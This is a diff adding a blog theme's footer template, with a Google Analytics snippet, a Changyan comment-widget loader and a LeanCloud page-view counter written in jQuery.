+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+<!-- Changyan Comments -->
+
+    <script type="text/javascript">
+        (function(){
+          var appid = 'cytbxr5F5';
+          var conf = 'prod_1b1213b19a954482c87045388c9c7954';
+          var width = window.innerWidth || document.documentElement.clientWidth;
+          if (width < 960) {
+          window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+            window.changyan.api.config({appid:appid,conf:conf})});
+          }
+        })();
+        </script>
+        <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+
+
+<!-- Disqus Comments -->
+
+
+    <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+    <script>AV.initialize("gXbogVvt7GkTh0IXllnbL00P-gzGzoHsz", "BUk2vE0XC6Uv6mlT4ToIRbGY");</script>
+    <script>
+      function showTime(Counter) {
+        var query = new AV.Query(Counter);
+        var entries = [];
+        var $visitors = $(".leancloud_visitors");
+  
+        $visitors.each(function () {
+          entries.push( $(this).attr("id").trim() );
+        });
+  
+        query.containedIn('url', entries);
+        query.find()
+          .done(function (results) {
+            var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+  
+            if (results.length === 0) {
+              $visitors.find(COUNT_CONTAINER_REF).text(0);
+              return;
+            }
+  
+            for (var i = 0; i < results.length; i++) {
+              var item = results[i];
+              var url = item.get('url');
+              var time = item.get('time');
+              var element = document.getElementById(url);
+  
+              $(element).find(COUNT_CONTAINER_REF).text(time);
+            }
+            for(var i = 0; i < entries.length; i++) {
+              var url = entries[i];
+              var element = document.getElementById(url);
+              var countSpan = $(element).find(COUNT_CONTAINER_REF);
+              if( countSpan.text() == '') {
+                countSpan.text(0);
+              }
+            }
+          })
+          .fail(function (object, error) {
+            console.log("Error: " + error.code + " " + error.message);
+          });
+      }
+  
+      function addCount(Counter) {
+        var $visitors = $(".leancloud_visitors");
+        var url = $visitors.attr('id').trim();
+        var title = $visitors.attr('data-flag-title').trim();
+        var query = new AV.Query(Counter);
+  
+        query.equalTo("url", url);
+        query.find({
+          success: function(results) {
+            if (results.length > 0) {
+              var counter = results[0];
+              counter.fetchWhenSave(true);
+              counter.increment("time");
+              counter.save(null, {
+                success: function(counter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                },
+                error: function(counter, error) {
+                  console.log('Failed to save Visitor num, with error message: ' + error.message);
+                }
+              });
+            } else {
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            }
+          },
+          error: function(error) {
+            console.log('Error:' + error.code + " " + error.message);
+          }
+        });
+      }
+  
+      $(function() {
+        var Counter = AV.Object.extend("Counter");
+        if ($('.leancloud_visitors').length == 1) {
+          addCount(Counter);
+        } else if ($('.post-title-link').length > 1) {
+          showTime(Counter);
+        }
+      });
+    </script>
+  
